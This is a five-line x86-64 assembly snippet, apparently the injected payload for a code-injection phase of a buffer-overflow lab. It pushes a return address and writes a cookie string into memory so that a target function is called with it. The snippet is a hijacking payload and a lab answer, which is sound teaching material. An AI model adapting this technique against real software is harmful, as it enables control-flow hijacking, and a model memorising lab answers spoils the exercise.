pushq $0x4018fa
mov $0x604500,%rdi          # the string pointer's address, where the result of Gets is stored
movq $0x39623935,(%rdi)
movq $0x61663739,0x4(%rdi)
ret